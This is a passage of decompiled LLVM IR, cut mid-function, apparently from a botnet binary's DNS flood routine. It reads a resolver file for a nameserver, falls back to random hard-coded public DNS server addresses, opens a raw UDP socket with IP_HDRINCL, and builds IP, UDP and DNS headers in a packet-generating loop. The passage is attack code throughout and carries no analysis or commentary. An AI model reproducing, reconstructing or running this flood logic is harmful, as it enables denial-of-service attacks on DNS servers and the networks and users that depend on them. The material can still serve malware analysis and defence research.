  store i32 %v0_d7bc, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_d7c4 = load i32, i32* @r5, align 4
  store i32 %v0_d7c4, i32* %r0.global-to-local, align 4
  %v5_d7c8 = inttoptr i32 %v0_d7b4 to i32*
  %v6_d7c8 = call i32 @attack_get_opt_int(i32 %v0_d7c4, i32* %v5_d7c8, i32 %v0_d7bc, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_d7d0 = load i32, i32* @sl, align 4
  store i32 %v0_d7d0, i32* %r3.global-to-local, align 4
  %v0_d7d4 = load i32, i32* @r4, align 4
  store i32 %v0_d7d4, i32* %r1.global-to-local, align 4
  %v0_d7dc = load i32, i32* @r5, align 4
  store i32 %v0_d7dc, i32* %r0.global-to-local, align 4
  %v5_d7e0 = inttoptr i32 %v0_d7d4 to i32*
  %v6_d7e0 = call i32 @attack_get_opt_str(i32 %v0_d7dc, i32* %v5_d7e0, i32 8, i32 %v0_d7d0, i32 %v6_d7c8)
  store i32 %v6_d7e0, i32* @r7, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_d7ec = call i32 @table_unlock_val(i32 37)
  %v0_d7f0 = load i32, i32* @sl, align 4
  store i32 %v0_d7f0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v2_d7f8 = inttoptr i32 %v0_d7f0 to i32*
  %v3_d7f8 = call i32 @table_retrieve_val(i32 37, i32* %v2_d7f8)
  store i32 %v3_d7f8, i32* %r0.global-to-local, align 4
  %v0_d7fc = load i32, i32* @sl, align 4
  store i32 %v0_d7fc, i32* %r1.global-to-local, align 4
  %v2_d800 = call i32 @__libc_open(i32 %v3_d7f8, i32 %v0_d7fc)
  store i32 %v2_d800, i32* @r4, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_d80c = call i32 @table_lock_val(i32 37)
  store i32 %v1_d80c, i32* %r0.global-to-local, align 4
  %v0_d810 = load i32, i32* @r4, align 4
  %v1_d810 = load i32, i32* @sl, align 4
  %v9_d810 = icmp eq i32 %v0_d810, %v1_d810
  store i1 %v9_d810, i1* %cpsr_z.global-to-local, align 1
  %v5_d814 = icmp slt i32 %v0_d810, %v1_d810
  br i1 %v5_d814, label %dec_label_pc_d8d0, label %dec_label_pc_d818

dec_label_pc_d818:                                ; preds = %entry
  %v2_d81c = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_d81c, i32* %sb.global-to-local, align 4
  store i32 2048, i32* @r2, align 4
  store i32 %v2_d81c, i32* @r1, align 4
  store i32 %v0_d810, i32* %r0.global-to-local, align 4
  %v1_d82c = call i32 @__libc_read(i32 %v0_d810)
  store i32 %v1_d82c, i32* @r6, align 4
  %v0_d834 = load i32, i32* @r4, align 4
  store i32 %v0_d834, i32* %r0.global-to-local, align 4
  %v1_d838 = call i32 @__GI___libc_close(i32 %v0_d834)
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_d840 = call i32 @table_unlock_val(i32 38)
  %v0_d844 = load i32, i32* @sl, align 4
  store i32 %v0_d844, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v2_d84c = inttoptr i32 %v0_d844 to i32*
  %v3_d84c = call i32 @table_retrieve_val(i32 38, i32* %v2_d84c)
  %v0_d850 = load i32, i32* @r6, align 4
  store i32 %v0_d850, i32* @r1, align 4
  store i32 %v3_d84c, i32* %r2.global-to-local, align 4
  store i32 %v2_d81c, i32* %r0.global-to-local, align 4
  %v3_d85c = bitcast i32* %stack_var_-2124 to i8*
  %v4_d85c = call i32 @util_stristr(i8* %v3_d85c, i32 %v0_d850, i32 %v3_d84c)
  store i32 %v4_d85c, i32* @r8, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_d868 = call i32 @table_lock_val(i32 38)
  store i32 %v1_d868, i32* %r0.global-to-local, align 4
  %v0_d86c = load i32, i32* @r8, align 4
  %v7_d86c = icmp eq i32 %v0_d86c, -1
  store i1 %v7_d86c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d86c, label %dec_label_pc_d8d0, label %dec_label_pc_d874

dec_label_pc_d874:                                ; preds = %dec_label_pc_d818
  %v0_d874 = load i32, i32* @r6, align 4
  %v9_d874 = icmp eq i32 %v0_d874, %v0_d86c
  store i1 %v9_d874, i1* %cpsr_z.global-to-local, align 1
  %v7_d878 = icmp sgt i32 %v0_d874, %v0_d86c
  br i1 %v7_d878, label %dec_label_pc_d87c, label %dec_label_pc_d8d0

dec_label_pc_d87c:                                ; preds = %dec_label_pc_d874
  %v0_d87c = load i32, i32* @sl, align 4
  store i32 %v0_d87c, i32* %r1.global-to-local, align 4
  %v0_d880 = load i32, i32* %sb.global-to-local, align 4
  %v2_d880 = add i32 %v0_d880, %v0_d86c
  store i32 %v2_d880, i32* %ip.global-to-local, align 4
  %v1_d890 = add i32 %v0_d874, -1
  br label %dec_label_pc_d888

dec_label_pc_d888:                                ; preds = %dec_label_pc_d8c4, %dec_label_pc_d87c
  %v0_d8c4 = phi i32 [ %v1_d8c4, %dec_label_pc_d8c4 ], [ %v0_d86c, %dec_label_pc_d87c ]
  %v0_d8ac = phi i32 [ %v0_d8ac27, %dec_label_pc_d8c4 ], [ %v0_d87c, %dec_label_pc_d87c ]
  %v0_d88c = phi i32 [ %v0_d88c23, %dec_label_pc_d8c4 ], [ %v0_d87c, %dec_label_pc_d87c ]
  %v0_d894 = phi i32 [ %v1_d894, %dec_label_pc_d8c4 ], [ %v2_d880, %dec_label_pc_d87c ]
  %v1_d888 = inttoptr i32 %v0_d894 to i8*
  %v2_d888 = load i8, i8* %v1_d888, align 1
  %v3_d888 = zext i8 %v2_d888 to i32
  store i32 %v3_d888, i32* %r0.global-to-local, align 4
  %v2_d88c = icmp eq i32 %v0_d88c, 0
  store i1 %v2_d88c, i1* %cpsr_z.global-to-local, align 1
  %v1_d894 = add i32 %v0_d894, 1
  store i32 %v1_d894, i32* %ip.global-to-local, align 4
  %v1_d898 = add nsw i32 %v3_d888, -48
  store i32 %v1_d898, i32* @lr, align 4
  br i1 %v2_d88c, label %dec_label_pc_d8a0, label %dec_label_pc_d8b0

dec_label_pc_d8a0:                                ; preds = %dec_label_pc_d888
  %v7_d8a0 = icmp eq i8 %v2_d888, 9
  store i1 %v7_d8a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d8a0, label %dec_label_pc_d8c4, label %bb

bb:                                               ; preds = %dec_label_pc_d8a0
  %v8_d8a4 = icmp eq i8 %v2_d888, 32
  store i1 %v8_d8a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_d8a4, label %dec_label_pc_d8c4, label %dec_label_pc_d8ac

dec_label_pc_d8ac:                                ; preds = %bb
  %v1_d8ac = add i32 %v0_d8ac, 1
  store i32 %v1_d8ac, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_d8b0

dec_label_pc_d8b0:                                ; preds = %dec_label_pc_d888, %dec_label_pc_d8ac
  %v0_d8ac28 = phi i32 [ %v0_d8ac, %dec_label_pc_d888 ], [ %v1_d8ac, %dec_label_pc_d8ac ]
  %v0_d88c24 = phi i32 [ %v0_d88c, %dec_label_pc_d888 ], [ %v1_d8ac, %dec_label_pc_d8ac ]
  %v7_d8b0 = icmp eq i8 %v2_d888, 46
  store i1 %v7_d8b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d8b0, label %dec_label_pc_d8bc, label %bb113

bb113:                                            ; preds = %dec_label_pc_d8b0
  %v3_d8b4 = icmp ugt i32 %v1_d898, 8
  %v8_d8b4 = icmp eq i32 %v1_d898, 9
  store i1 %v8_d8b4, i1* %cpsr_z.global-to-local, align 1
  %v2_d8b8 = xor i1 %v8_d8b4, true
  %v3_d8b8 = and i1 %v3_d8b4, %v2_d8b8
  br i1 %v3_d8b8, label %dec_label_pc_dd24, label %dec_label_pc_d8bc

dec_label_pc_d8bc:                                ; preds = %dec_label_pc_d8b0, %bb113
  %v9_d8bc = icmp eq i32 %v1_d890, %v0_d8c4
  store i1 %v9_d8bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d8bc, label %dec_label_pc_dd24, label %dec_label_pc_d8c4

dec_label_pc_d8c4:                                ; preds = %dec_label_pc_d8a0, %dec_label_pc_d8bc, %bb
  %v0_d8ac27 = phi i32 [ %v0_d8ac, %dec_label_pc_d8a0 ], [ %v0_d8ac28, %dec_label_pc_d8bc ], [ %v0_d8ac, %bb ]
  %v0_d88c23 = phi i32 [ 0, %dec_label_pc_d8a0 ], [ %v0_d88c24, %dec_label_pc_d8bc ], [ 0, %bb ]
  %v1_d8c4 = add i32 %v0_d8c4, 1
  store i32 %v1_d8c4, i32* @r4, align 4
  %v9_d8c8 = icmp eq i32 %v1_d8c4, %v0_d874
  store i1 %v9_d8c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d8c8, label %dec_label_pc_d8d0, label %dec_label_pc_d888

dec_label_pc_d8d0:                                ; preds = %dec_label_pc_d8c4, %dec_label_pc_d874, %dec_label_pc_d818, %entry
  %v0_d8d0 = call i32 @rand_next()
  %v1_d8d4 = urem i32 %v0_d8d0, 4
  store i32 %v1_d8d4, i32* %r0.global-to-local, align 4
  %v2_d8d8 = icmp eq i32 %v1_d8d4, 3
  store i1 %v2_d8d8, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_d8d0 to i2
  switch i2 %trunc, label %dec_label_pc_d90410 [
    i2 0, label %dec_label_pc_dd70
    i2 1, label %dec_label_pc_dd84
    i2 -2, label %dec_label_pc_dd60
    i2 -1, label %dec_label_pc_d8f4
  ]

dec_label_pc_d8f4:                                ; preds = %dec_label_pc_d8d0
  store i32 33686020, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d904

dec_label_pc_d90410:                              ; preds = %dec_label_pc_d8d0
  unreachable

dec_label_pc_d904:                                ; preds = %dec_label_pc_dd84, %dec_label_pc_dd70, %dec_label_pc_dd60, %dec_label_pc_dd24, %dec_label_pc_d8f4
  %stack_var_-2184.0 = phi i32 [ 33686020, %dec_label_pc_d8f4 ], [ 104859200, %dec_label_pc_dd60 ], [ 707416650, %dec_label_pc_dd84 ], [ 134744072, %dec_label_pc_dd70 ], [ %v1_dd54, %dec_label_pc_dd24 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_d908 = call i32 @__GI_time(i32* null)
  %v0_d90c = load i32, i32* @r7, align 4
  %v2_d90c = icmp eq i32 %v0_d90c, 0
  store i1 %v2_d90c, i1* %cpsr_z.global-to-local, align 1
  %v1_d910 = load i32, i32* @fp, align 4
  %v2_d910 = add i32 %v1_d910, %v2_d908
  store i32 %v2_d910, i32* %r0.global-to-local, align 4
  br i1 %v2_d90c, label %dec_label_pc_dcfc, label %dec_label_pc_d91c

dec_label_pc_d91c:                                ; preds = %dec_label_pc_d904
  store i32 %v0_d90c, i32* %r0.global-to-local, align 4
  %v1_d920 = inttoptr i32 %v0_d90c to i8*
  %v2_d920 = call i32 @util_strlen(i8* %v1_d920)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_d934 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_d934, i32* %r0.global-to-local, align 4
  %v7_d938 = icmp eq i32 %v3_d934, -1
  store i1 %v7_d938, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d938, label %dec_label_pc_dcfc, label %dec_label_pc_d944

dec_label_pc_d944:                                ; preds = %dec_label_pc_d91c
  store i32 1, i32* %stack_var_-44, align 4
  %v6_d94c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_d94c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_d960 = call i32 @__GI_setsockopt(i32 %v3_d934, i32 0, i32 3, i32 %v6_d94c, i32 4)
  store i32 %v5_d960, i32* %r0.global-to-local, align 4
  %v7_d964 = icmp eq i32 %v5_d960, -1
  store i1 %v7_d964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d964, label %dec_label_pc_dcf4, label %dec_label_pc_d96c

dec_label_pc_d96c:                                ; preds = %dec_label_pc_d944
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v3_d988 = mul i32 %v6_d794, 65536
  store i32 %v3_d988, i32* %sb.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_d998 = urem i32 %v7_d720, 65536
  %v3_d99c = urem i32 %v6_d77c, 65536
  store i32 %v3_d99c, i32* %r0.global-to-local, align 4
  %v3_d9a0 = urem i32 %v6_d794, 65536
  store i32 %v3_d9a0, i32* %r1.global-to-local, align 4
  %v3_d9a4 = urem i32 %v6_d7b0, 65536
  store i32 %v3_d9a4, i32* %r2.global-to-local, align 4
  %v2_d9a8 = icmp eq i32 %arg2, 0
  store i1 %v2_d9a8, i1* %cpsr_z.global-to-local, align 1
  %v1_d9ac = urem i32 %v6_d7c8, 256
  store i32 %v1_d9ac, i32* @sl, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d9a8, label %dec_label_pc_dd0c.critedge, label %dec_label_pc_d9c8

dec_label_pc_d9c8:                                ; preds = %dec_label_pc_d96c
  %v3_d97c = mul i32 %v6_d7b0, 65536
  %v2_d9d4 = add i32 %v2_d920, %v1_d9ac
  %v3_d9d8 = mul i32 %v2_d9d4, 65536
  %v1_d9e4 = add i32 %v3_d9d8, 1769472
  %tmp114 = mul nuw nsw i32 %v3_d9a0, 256
  %v3_d9e8 = and i32 %tmp114, 65280
  %v1_d9ec = add i32 %v3_d9d8, 3080192
  %tmp115 = udiv i32 %v6_d794, 256
  %v4_d9fc = urem i32 %tmp115, 256
  %v5_d9fc = or i32 %v3_d9e8, %v4_d9fc
  store i32 %v5_d9fc, i32* @sb, align 4
  store i32 %v3_d97c, i32* %ip.global-to-local, align 4
  %tmp116 = udiv i32 %v1_d9e4, 256
  %v3_da04 = and i32 %tmp116, 65280
  %tmp117 = udiv i32 %v1_d9ec, 256
  %v3_da08 = and i32 %tmp117, 65280
  store i32 %v3_da08, i32* %r2.global-to-local, align 4
  %tmp118 = mul i32 %v6_d7b0, 256
  %v3_da0c = and i32 %tmp118, 65280
  %v4_da10 = udiv i32 %v1_d9e4, 16777216
  %v5_da10 = or i32 %v3_da04, %v4_da10
  store i32 %v5_da10, i32* @fp, align 4
  %tmp119 = mul i32 %v7_d720, 256
  %v3_da18 = and i32 %tmp119, 65280
  store i32 %v3_da18, i32* %r1.global-to-local, align 4
  %v4_da1c = udiv i32 %v1_d9ec, 16777216
  %v5_da1c = or i32 %v3_da08, %v4_da1c
  store i32 %v5_da1c, i32* %r3.global-to-local, align 4
  %tmp120 = udiv i32 %v6_d7b0, 256
  %v4_da20 = urem i32 %tmp120, 256
  %v5_da20 = or i32 %v4_da20, %v3_da0c
  store i32 %v5_da20, i32* @r4, align 4
  store i32 %v2_d920, i32* @lr, align 4
  %tmp121 = udiv i32 %v7_d720, 256
  %v4_da28 = urem i32 %tmp121, 256
  %v5_da28 = or i32 %v4_da28, %v3_da18
  %tmp122 = mul i32 %v6_d77c, 256
  %v3_da2c = and i32 %tmp122, 65280
  store i32 %v3_da2c, i32* %r0.global-to-local, align 4
  %tmp123 = udiv i32 %v6_d77c, 256
  %v4_da3c = urem i32 %tmp123, 256
  %v5_da3c = or i32 %v4_da3c, %v3_da2c
  store i32 %v5_da3c, i32* @r8, align 4
  store i32 0, i32* @r5, align 4
  %v1_da44 = add i32 %v2_d920, 1
  store i32 %v1_da44, i32* @r6, align 4
  %v1_da8c = trunc i32 %v6_d6fc to i8
  %sext = mul i32 %v6_d738, 16777216
  %v4_da90 = sdiv i32 %sext, 16777216
  %sext6 = mul nuw i32 %v5_da1c, 65536
  %v4_da98 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_da28, 65536
  %v4_da9c = sdiv i32 %sext7, 65536
  %sext8 = mul nuw i32 %v5_da20, 65536
  %v4_daf8 = sdiv i32 %sext8, 65536
  %v2_db1c = icmp eq i32 %v2_d920, 0
  %tmp124 = icmp slt i32 %v2_d920, 1
  %v1_daa4 = trunc i32 %v4_da90 to i8
  br label %dec_label_pc_da48

dec_label_pc_da48:                                ; preds = %dec_label_pc_db68, %dec_label_pc_d9c8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_da50 = call i32 @calloc(i32 600, i32 1)
  store i32 %v2_da50, i32* %r0.global-to-local, align 4
  store i32 %v2_d6e4, i32* %r1.global-to-local, align 4
  %v3_da58 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_da58, i32* %r3.global-to-local, align 4
  %v2_da5c = load i32, i32* @r5, align 4
  %v5_da5c = mul i32 %v2_da5c, 4
  %v6_da5c = add i32 %v5_da5c, %v2_d6e4
  %v7_da5c = inttoptr i32 %v6_da5c to i32*
  store i32 %v2_da50, i32* %v7_da5c, align 4
  %v0_da60 = load i32, i32* %r1.global-to-local, align 4
  %v1_da60 = load i32, i32* %r3.global-to-local, align 4
  %v4_da60 = mul i32 %v1_da60, 4
  %v5_da60 = add i32 %v4_da60, %v0_da60
  %v6_da60 = inttoptr i32 %v5_da60 to i32*
  %v7_da60 = load i32, i32* %v6_da60, align 4
  store i32 %v7_da60, i32* %r1.global-to-local, align 4
  %v1_da64 = inttoptr i32 %v7_da60 to i8*
  %v2_da64 = load i8, i8* %v1_da64, align 1
  %tmp = urem i8 %v2_da64, 16
  %v1_da68 = zext i8 %tmp to i32
  %v1_da6c = or i32 %v1_da68, 64
  store i32 %v1_da6c, i32* %r2.global-to-local, align 4
  %v1_da70 = trunc i32 %v1_da6c to i8
  store i8 %v1_da70, i8* %v1_da64, align 1
  %v0_da74 = load i32, i32* %r1.global-to-local, align 4
  %v1_da74 = inttoptr i32 %v0_da74 to i8*
  %v2_da74 = load i8, i8* %v1_da74, align 1
  %v1_da78 = and i8 %v2_da74, -16
  %v1_da7c = or i8 %v1_da78, 5
  store i32 %v1_d764, i32* %ip.global-to-local, align 4
  store i8 %v1_da7c, i8* %v1_da74, align 1
  store i32 %v1_d708, i32* %lr.global-to-local, align 4
  %v2_da8c = load i32, i32* %r1.global-to-local, align 4
  %v3_da8c = add i32 %v2_da8c, 1
  %v4_da8c = inttoptr i32 %v3_da8c to i8*
  store i8 %v1_da8c, i8* %v4_da8c, align 1
  store i32 %v4_da90, i32* %r3.global-to-local, align 4
  %v0_da94 = load i32, i32* %ip.global-to-local, align 4
  %v2_da94 = icmp eq i32 %v0_da94, 0
  store i1 %v2_da94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_da98, i32* %r0.global-to-local, align 4
  store i32 %v4_da9c, i32* %r2.global-to-local, align 4
  br i1 %v2_da94, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_da48
  store i32 64, i32* %lr.global-to-local, align 4
  br label %bb126

bb126:                                            ; preds = %dec_label_pc_da48, %bb125
  %v2_daa4 = load i32, i32* %r1.global-to-local, align 4
  %v3_daa4 = add i32 %v2_daa4, 8
  %v4_daa4 = inttoptr i32 %v3_daa4 to i8*
  store i8 %v1_daa4, i8* %v4_daa4, align 1
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_daac = load i32, i32* %r1.global-to-local, align 4
  %v3_daac = add i32 %v2_daac, 9
  %v4_daac = inttoptr i32 %v3_daac to i8*
  store i8 17, i8* %v4_daac, align 1
  %v0_dab0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dab0, label %bb128, label %bb127

bb127:                                            ; preds = %bb126
  %v1_dab0 = load i32, i32* %lr.global-to-local, align 4
  %v2_dab0 = trunc i32 %v1_dab0 to i16
  %v3_dab0 = load i32, i32* %r1.global-to-local, align 4
  %v4_dab0 = add i32 %v3_dab0, 6
  %v5_dab0 = inttoptr i32 %v4_dab0 to i16*
  store i16 %v2_dab0, i16* %v5_dab0, align 2
  br label %bb128

bb128:                                            ; preds = %bb126, %bb127
  store i32 ptrtoint (i32* @global_var_2610c.91 to i32), i32* @lr, align 4
  %v0_dab8 = load i32, i32* %r0.global-to-local, align 4
  %v1_dab8 = trunc i32 %v0_dab8 to i16
  %v2_dab8 = load i32, i32* %r1.global-to-local, align 4
  %v3_dab8 = add i32 %v2_dab8, 2
  %v4_dab8 = inttoptr i32 %v3_dab8 to i16*
  store i16 %v1_dab8, i16* %v4_dab8, align 2
  %v0_dabc = load i32, i32* %r2.global-to-local, align 4
  %v1_dabc = trunc i32 %v0_dabc to i16
  %v2_dabc = load i32, i32* %r1.global-to-local, align 4
  %v3_dabc = add i32 %v2_dabc, 4
  %v4_dabc = inttoptr i32 %v3_dabc to i16*
  store i16 %v1_dabc, i16* %v4_dabc, align 2
  %v2_dac0 = load i32, i32* @global_var_2610c.91, align 4
  store i32 %v2_dac0, i32* %r3.global-to-local, align 4
  %v0_dac4 = load i32, i32* %r1.global-to-local, align 4
  %v1_dac4 = add i32 %v0_dac4, 20
  store i32 %v1_dac4, i32* %r0.global-to-local, align 4
  %v1_dac8 = add i32 %v0_dac4, 41
  store i32 %v1_dac8, i32* %r2.global-to-local, align 4
  %v0_dacc = load i32, i32* @fp, align 4
  %v1_dacc = trunc i32 %v0_dacc to i16
  %v3_dacc = add i32 %v0_dac4, 24
  %v4_dacc = inttoptr i32 %v3_dacc to i16*
  store i16 %v1_dacc, i16* %v4_dacc, align 2
  %v0_dad0 = load i32, i32* @sb, align 4
  %v1_dad0 = trunc i32 %v0_dad0 to i16
  %v2_dad0 = load i32, i32* %r0.global-to-local, align 4
  %v3_dad0 = add i32 %v2_dad0, 2
  %v4_dad0 = inttoptr i32 %v3_dad0 to i16*
  store i16 %v1_dad0, i16* %v4_dad0, align 2
  %v0_dad4 = load i32, i32* %r1.global-to-local, align 4
  %v1_dad4 = add i32 %v0_dad4, 28
  store i32 %v1_dad4, i32* %ip.global-to-local, align 4
  %v0_dad8 = load i32, i32* %r2.global-to-local, align 4
  %v1_dad8 = load i32, i32* @sl, align 4
  %v2_dad8 = add i32 %v1_dad8, %v0_dad8
  store i32 %v2_dad8, i32* @r4, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_dae4 = load i32, i32* @r8, align 4
  %v1_dae4 = trunc i32 %v0_dae4 to i16
  %v3_dae4 = add i32 %v0_dad4, 20
  %v4_dae4 = inttoptr i32 %v3_dae4 to i16*
  store i16 %v1_dae4, i16* %v4_dae4, align 2
  %v0_dae8 = load i32, i32* %r3.global-to-local, align 4
  %v1_dae8 = load i32, i32* %r1.global-to-local, align 4
  %v2_dae8 = add i32 %v1_dae8, 12
  %v3_dae8 = inttoptr i32 %v2_dae8 to i32*
  store i32 %v0_dae8, i32* %v3_dae8, align 4
  %v0_daec = load i32, i32* %r0.global-to-local, align 4
  %v1_daec = trunc i32 %v0_daec to i16
  %v2_daec = load i32, i32* %ip.global-to-local, align 4
  %v3_daec = add i32 %v2_daec, 4
  %v4_daec = inttoptr i32 %v3_daec to i16*
  store i16 %v1_daec, i16* %v4_daec, align 2
  %v0_daf0 = load i32, i32* %r2.global-to-local, align 4
  %v1_daf0 = trunc i32 %v0_daf0 to i16
  %v2_daf0 = load i32, i32* %ip.global-to-local, align 4
  %v3_daf0 = add i32 %v2_daf0, 2
  %v4_daf0 = inttoptr i32 %v3_daf0 to i16*
  store i16 %v1_daf0, i16* %v4_daf0, align 2
  store i32 %stack_var_-2184.0, i32* %r3.global-to-local, align 4
  store i32 %v4_daf8, i32* %ip.global-to-local, align 4
  %v1_dafc = load i32, i32* %r1.global-to-local, align 4
  %v2_dafc = add i32 %v1_dafc, 16
  %v3_dafc = inttoptr i32 %v2_dafc to i32*
  store i32 %stack_var_-2184.0, i32* %v3_dafc, align 4
  %v0_db00 = load i32, i32* %ip.global-to-local, align 4
  %v1_db00 = trunc i32 %v0_db00 to i16
  %v2_db00 = load i32, i32* %r1.global-to-local, align 4
  %v3_db00 = add i32 %v2_db00, 28
  %v4_db00 = inttoptr i32 %v3_db00 to i16*
  store i16 %v1_db00, i16* %v4_db00, align 2
  %v0_db04 = load i32, i32* @sl, align 4
  %v1_db04 = trunc i32 %v0_db04 to i8
  %v2_db04 = load i32, i32* %r1.global-to-local, align 4
  %v3_db04 = add i32 %v2_db04, 40
  %v4_db04 = inttoptr i32 %v3_db04 to i8*
  store i8 %v1_db04, i8* %v4_db04, align 1
  %v0_db08 = load i32, i32* @r4, align 4
  %v1_db08 = add i32 %v0_db08, 1
  store i32 %v1_db08, i32* %r0.global-to-local, align 4
  %v0_db0c = load i32, i32* @r7, align 4
  store i32 %v0_db0c, i32* %r1.global-to-local, align 4
  %v0_db10 = load i32, i32* @r6, align 4
  store i32 %v0_db10, i32* %r2.global-to-local, align 4
  %v3_db14 = call i32 @util_memcpy(i32 %v1_db08, i32 %v0_db0c, i32 %v0_db10)
  store i32 %v3_db14, i32* %r0.global-to-local, align 4
  store i32 %v2_d920, i32* %lr.global-to-local, align 4
  store i1 %v2_db1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %tmp124, label %.dec_label_pc_db68_crit_edge, label %dec_label_pc_db2c

.dec_label_pc_db68_crit_edge:                     ; preds = %bb128
  %v5_db20 = load i32, i32* @r4, align 4
  store i32 %v5_db20, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_db68

dec_label_pc_db2c:                                ; preds = %bb128
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_db30 = load i32, i32* @r4, align 4
  store i32 %v0_db30, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_db38

dec_label_pc_db38:                                ; preds = %.thread21, %dec_label_pc_db2c
  %v1_db40 = phi i32 [ %v1_db4035, %.thread21 ], [ 0, %dec_label_pc_db2c ]
  %v0_db5419 = phi i32 [ %v0_db60, %.thread21 ], [ 0, %dec_label_pc_db2c ]
  %v1_db38 = load i32, i32* @r7, align 4
  %v2_db38 = add i32 %v1_db38, %v0_db5419
  %v3_db38 = inttoptr i32 %v2_db38 to i8*
  %v4_db38 = load i8, i8* %v3_db38, align 1
  %v6_db38 = zext i8 %v4_db38 to i32
  store i32 %v6_db38, i32* %r3.global-to-local, align 4
  %v7_db3c = icmp eq i8 %v4_db38, 46
  store i1 %v7_db3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_db3c, label %bb129, label %bb131

bb129:                                            ; preds = %dec_label_pc_db38
  %v2_db40 = trunc i32 %v1_db40 to i8
  %v3_db40 = load i32, i32* %r0.global-to-local, align 4
  %v4_db40 = inttoptr i32 %v3_db40 to i8*
  store i8 %v2_db40, i8* %v4_db40, align 1
  %v0_db48.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_db44 = load i32, i32* %ip.global-to-local, align 4
  %v1_db44 = add i32 %v0_db44, 1
  store i32 %v1_db44, i32* %r2.global-to-local, align 4
  br i1 %v0_db48.pr, label %bb132, label %bb130

bb130:                                            ; preds = %bb129
  %v2_db4817 = urem i32 %v1_db44, 256
  store i32 %v2_db4817, i32* %ip.global-to-local, align 4
  store i32 %v2_d920, i32* %r2.global-to-local, align 4
  %v0_db54.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_db54 = add i32 %v0_db54.pre, 1
  store i32 %v1_db54, i32* %r1.global-to-local, align 4
  br label %.thread21

bb131:                                            ; preds = %dec_label_pc_db38
  %v1_db4413 = add nsw i32 %v1_db40, 1
  %v2_db48 = urem i32 %v1_db4413, 256
  store i32 %v2_db48, i32* %ip.global-to-local, align 4
  store i32 %v2_d920, i32* %r2.global-to-local, align 4
  %v1_db5420 = add i32 %v0_db5419, 1
  store i32 %v1_db5420, i32* %r1.global-to-local, align 4
  br label %.thread21

bb132:                                            ; preds = %bb129
  store i32 %v2_d920, i32* %r2.global-to-local, align 4
  %v1_db50.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_db50 = load i32, i32* @r4, align 4
  %v3_db50 = add i32 %v2_db50, %v1_db50.pre
  store i32 %v3_db50, i32* %r3.global-to-local, align 4
  %v1_db5465 = add i32 %v1_db50.pre, 1
  store i32 %v1_db5465, i32* %r1.global-to-local, align 4
  %v2_db58 = add i32 %v3_db50, 1
  store i32 %v2_db58, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread21

.thread21:                                        ; preds = %bb131, %bb130, %bb132
  %v0_db60 = phi i32 [ %v1_db54, %bb130 ], [ %v1_db5420, %bb131 ], [ %v1_db5465, %bb132 ]
  %v1_db4035 = phi i32 [ %v2_db4817, %bb130 ], [ %v2_db48, %bb131 ], [ 0, %bb132 ]
  %v9_db60 = icmp eq i32 %v0_db60, %v2_d920
  store i1 %v9_db60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_db60, label %dec_label_pc_db68.loopexit, label %dec_label_pc_db38

dec_label_pc_db68.loopexit:                       ; preds = %.thread21
  %v2_db68.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t71 = trunc i32 %v1_db4035 to i8
  br label %dec_label_pc_db68

dec_label_pc_db68:                                ; preds = %.dec_label_pc_db68_crit_edge, %dec_label_pc_db68.loopexit
  %v0_db68.pre.sink.off0 = phi i8 [ 0, %.dec_label_pc_db68_crit_edge ], [ %extract.t71, %dec_label_pc_db68.loopexit ]
  %v2_db68 = phi i32 [ %v5_db20, %.dec_label_pc_db68_crit_edge ], [ %v2_db68.pre, %dec_label_pc_db68.loopexit ]
  %v3_db68 = inttoptr i32 %v2_db68 to i8*
